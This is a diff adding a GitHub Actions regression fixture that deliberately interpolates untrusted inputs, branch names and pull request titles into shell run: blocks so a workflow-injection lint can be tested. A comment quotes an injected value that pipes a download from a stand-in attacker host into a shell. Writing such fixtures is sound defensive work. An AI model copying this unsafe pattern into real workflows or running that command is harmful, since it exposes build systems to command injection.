@@ -1,0 +1,71 @@
+# workflow-injection-fixture.yml
+#
+# Regression fixture for validate-workflow-injection.sh.
+# Replicates the UNSAFE pattern that CodeRabbit flagged in PR #99:
+# ${{ inputs.skip-extra-tasks }} interpolated directly inside a run: block.
+#
+# This file is NOT a real workflow — it exists only to prove the lint catches
+# the injection vector before it reaches code review.
+#
+# DO NOT FIX THE UNSAFE PATTERN HERE.  The lint test expects it to be flagged.
+
+name: Fixture — Injection Regression (PR #99)
+
+on:
+  workflow_call:
+    inputs:
+      skip-extra-tasks:
+        description: 'Comma-separated Gradle task names to exclude from build'
+        required: false
+        type: string
+        default: ''
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Apply extra skipped tasks (UNSAFE — PR #99 regression fixture, run: |)
+        # UNSAFE: ${{ inputs.skip-extra-tasks }} is interpolated directly into
+        # the shell script.  An attacker-supplied value such as
+        # "ft; curl https://evil.example | sh" would be executed verbatim.
+        # Safe fix: move to env: block (see validate-workflow-injection.sh hint).
+        if: inputs.skip-extra-tasks != ''
+        run: |
+          EXTRA_SKIP_TESTS=""
+          IFS=',' read -r -a tasks <<< "${{ inputs.skip-extra-tasks }}"
+          for task in "${tasks[@]}"; do
+            EXTRA_SKIP_TESTS="${EXTRA_SKIP_TESTS} -x ${task}"
+          done
+          echo "SKIP_TESTS=${EXTRA_SKIP_TESTS}" >> "$GITHUB_ENV"
+
+      - name: UNSAFE — strip chomp (run: |-)
+        run: |-
+          echo "${{ inputs.skip-extra-tasks }}"
+
+      - name: UNSAFE — keep chomp (run: |+)
+        run: |+
+          echo "${{ inputs.skip-extra-tasks }}"
+
+      - name: UNSAFE — folded strip (run: >-)
+        run: >-
+          echo "${{ github.head_ref }}"
+
+      - name: UNSAFE — folded keep (run: >+)
+        run: >+
+          echo "${{ github.event.pull_request.title }}"
+
+      - name: UNSAFE — inline
+        run: echo "${{ inputs.skip-extra-tasks }}"
+
+      # YAML list-marker step-first form: "- run: ..." without a preceding "- name:".
+      - run: echo "${{ inputs.skip-extra-tasks }}"
+
+      - run: |
+          echo "${{ inputs.skip-extra-tasks }}"
+
+      - run: >-
+          echo "${{ github.head_ref }}"
+
+      - name: UNSAFE — block scalar with trailing comment (run: | # comment)
+        run: |  # inline YAML comment must not prevent detection
+          echo "${{ inputs.skip-extra-tasks }}"
